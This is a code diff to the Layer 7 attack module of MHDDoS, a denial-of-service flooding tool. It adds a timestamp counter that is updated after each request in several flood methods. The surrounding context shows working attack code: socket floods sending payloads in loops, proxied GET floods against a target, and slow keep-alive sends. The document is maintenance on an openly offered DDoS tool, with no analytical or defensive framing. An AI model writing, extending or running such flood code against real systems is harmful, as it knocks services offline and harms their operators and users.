@@ -4,6 +4,7 @@ Implementations of layer 7 attack methods of MHDDoS.
 
 import subprocess
 # noinspection PyBroadException
+import time
 from contextlib import suppress
 from pathlib import Path
 from random import choice, randint
@@ -63,7 +64,8 @@ class Layer7(Thread):
                  referers: List[str] = None,
                  proxies: List[Proxy] = None,
                  bytes_sent_counter: Counter = None,
-                 requests_sent_counter: Counter = None):
+                 requests_sent_counter: Counter = None,
+                 last_request_timestamp: Counter = None):
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._synevent = synevent
@@ -117,6 +119,7 @@ class Layer7(Thread):
 
         self._requests_sent = requests_sent_counter
         self._bytes_sent = bytes_sent_counter
+        self._last_request_timestamp = last_request_timestamp
 
     def run(self) -> None:
         if self._synevent:
@@ -192,6 +195,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -208,6 +212,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -226,6 +231,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -240,6 +246,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -262,6 +269,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -273,6 +281,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(self._defaultpayload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(self._defaultpayload)
         except Exception:
             s.close()
@@ -285,6 +294,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -315,10 +325,12 @@ class Layer7(Thread):
                 s.send(p2)
                 self._bytes_sent += len(p1 + p2)
                 self._requests_sent += 2
+                self._last_request_timestamp.set(time.time())
 
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -330,6 +342,7 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 while s.send(payload) and s.recv(1):
                     self._requests_sent += 1
+                    self._last_request_timestamp.set(time.time())
                     self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -342,6 +355,7 @@ class Layer7(Thread):
                 for _ in range(min(self._rpc, 5)):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -358,11 +372,13 @@ class Layer7(Thread):
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             self._requests_sent += 1
+                            self._last_request_timestamp.set(time.time())
                             self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
@@ -376,6 +392,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -389,6 +406,7 @@ class Layer7(Thread):
                     sleep(max(self._rpc / 1000, 1))
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -404,11 +422,13 @@ class Layer7(Thread):
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             self._requests_sent += 1
+                            self._last_request_timestamp.set(time.time())
                             self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += Tools.sizeOfRequest(res)
             except Exception:
                 s.close()
@@ -426,6 +446,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -443,6 +464,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
                         while 1:
                             sleep(.01)
@@ -467,11 +489,13 @@ class Layer7(Thread):
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             self._requests_sent += 1
+                            self._last_request_timestamp.set(time.time())
                             self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
@@ -501,6 +525,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -518,6 +543,7 @@ class Layer7(Thread):
                 for _ in range(self._rpc):
                     if s.send(payload):
                         self._requests_sent += 1
+                        self._last_request_timestamp.set(time.time())
                         self._bytes_sent += len(payload)
         except Exception:
             s.close()
@@ -535,6 +561,7 @@ class Layer7(Thread):
                         if s.send(keep):
                             sleep(self._rpc / 15)
                             self._requests_sent += 1
+                            self._last_request_timestamp.set(time.time())
                             self._bytes_sent += len(keep)
                     break
         except Exception:
